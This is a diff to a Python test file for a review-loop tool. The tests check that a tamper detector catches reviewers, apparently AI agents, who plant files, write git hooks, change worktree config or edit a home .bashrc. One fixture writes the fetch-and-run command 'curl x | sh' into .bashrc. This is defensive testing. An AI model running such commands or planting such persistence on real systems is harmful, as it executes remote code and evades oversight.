@@ -3083,6 +3083,7 @@ class TestCredentialShapes:
             "git+ssh://git@github.com:org/repo.git@v1.0",
             "'https://example.com'.replace('x','mailto:ops@example.com')",
             '<a href="http://localhost:8080">ops@example.com</a>',
+            "const a = [`http://localhost:8080`,`ops@example.com`]",
             "<a href='http://localhost:8080'>ops@example.com</a>",
             "postgres://u:{{password}}@h",
             "postgres://u:{password!r}@h",
@@ -3241,7 +3242,12 @@ class TestAMissingReviewerIsNotConvergence:
     """
 
     @staticmethod
-    def _round(tmp_path: Path, results: list, report_only: bool = False):
+    def _round(
+        tmp_path: Path,
+        results: list,
+        report_only: bool = False,
+        touched: list[str] | None = None,
+    ):
         """One round with the reviewers stubbed out, returning (code, fingerprint, stdout)."""
         import io
         from contextlib import redirect_stdout
@@ -3260,6 +3266,9 @@ class TestAMissingReviewerIsNotConvergence:
             mock.patch.object(loop, "extract_results", return_value=results),
             mock.patch.object(loop, "write_artifacts_key"),
             mock.patch.object(loop, "describe_outputs", return_value=""),
+            # An untouched tree unless the test says otherwise: tmp_path is no git
+            # repository, and the check fails closed there.
+            mock.patch.object(loop.tamper, "report", return_value=touched or []),
             redirect_stdout(out),
         ):
             code, fp = loop._run_one_round(
@@ -3312,17 +3321,18 @@ class TestAMissingReviewerIsNotConvergence:
         # reviewer wrote.
         import scripts.review_until_converged as loop
 
+        planted = ["?? planted.py x"]
         results = [self._blocking("a")] + [self._clean(n) for n in "bcd"]
-        with (
-            mock.patch.object(loop.tamper, "report", return_value=["?? planted.py x"]),
-            mock.patch.object(loop, "apply_fixes") as fixes,
-        ):
-            code, _, said = self._round(tmp_path, results)
+        with mock.patch.object(loop, "apply_fixes") as fixes:
+            code, _, said = self._round(tmp_path, results, touched=planted)
         assert code == 12 and "ABORT: the reviewers changed the working tree" in said
         fixes.assert_not_called()
+        # Nor does a round with nothing blocking call itself converged.
+        clean = [self._clean(n) for n in "abcd"]
+        code, _, said = self._round(tmp_path, clean, touched=planted)
+        assert code == 12 and "CONVERGED" not in said
         # --report-only reports it, and goes on to its own exit.
-        with mock.patch.object(loop.tamper, "report", return_value=["?? planted.py x"]):
-            code, _, _ = self._round(tmp_path, results, report_only=True)
+        code, _, _ = self._round(tmp_path, results, report_only=True, touched=planted)
         assert code == 10
 
     def test_the_new_exit_code_is_documented(self) -> None:
@@ -3561,6 +3571,51 @@ class TestTamper:
         (tmp_path / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\n")
         touched = tamper.changed(before, tamper.snapshot(tmp_path))
         assert any("pre-commit" in line for line in touched)
+
+    def test_a_write_to_a_hooks_path_set_elsewhere_is_reported(
+        self, tmp_path: Path
+    ) -> None:
+        # core.hooksPath put the hooks git runs outside .git, where the check did not look.
+        from scripts.review_loop import tamper
+
+        repo = tmp_path / "repo"
+        subprocess.run(["git", "init", "-q", str(repo)], check=True)
+        hooks = tmp_path / "hooks"
+        hooks.mkdir()
+        subprocess.run(
+            ["git", "-C", str(repo), "config", "core.hooksPath", str(hooks)], check=True
+        )
+        before = tamper.snapshot(repo)
+        (hooks / "pre-commit").write_text("#!/bin/sh\n")
+        touched = tamper.changed(before, tamper.snapshot(repo))
+        assert any("pre-commit" in line for line in touched)
+
+    def test_a_worktree_config_change_is_reported(self, tmp_path: Path) -> None:
+        from scripts.review_loop import tamper
+
+        subprocess.run(["git", "init", "-q", str(tmp_path)], check=True)
+        git = ["git", "-C", str(tmp_path)]
+        worktree_config = "extensions.worktreeConfig"
+        subprocess.run([*git, "config", worktree_config, "true"], check=True)
+        before = tamper.snapshot(tmp_path)
+        subprocess.run([*git, "config", "--worktree", "core.editor", "x"], check=True)
+        touched = tamper.changed(before, tamper.snapshot(tmp_path))
+        assert any("config.worktree" in line for line in touched)
+
+    def test_a_write_to_a_home_startup_file_is_reported(
+        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
+    ) -> None:
+        # hermes writes outside the repository too.
+        from scripts.review_loop import merge_agent, tamper
+
+        repo, home = tmp_path / "repo", tmp_path / "home"
+        home.mkdir()
+        subprocess.run(["git", "init", "-q", str(repo)], check=True)
+        monkeypatch.setattr(merge_agent, "_homes", lambda: {home})
+        before = tamper.snapshot(repo)
+        (home / ".bashrc").write_text("curl x | sh\n")
+        touched = tamper.changed(before, tamper.snapshot(repo))
+        assert any(".bashrc" in line for line in touched)
 
     def test_an_unchanged_tree_reports_nothing(self, tmp_path: Path) -> None:
         from scripts.review_loop import tamper
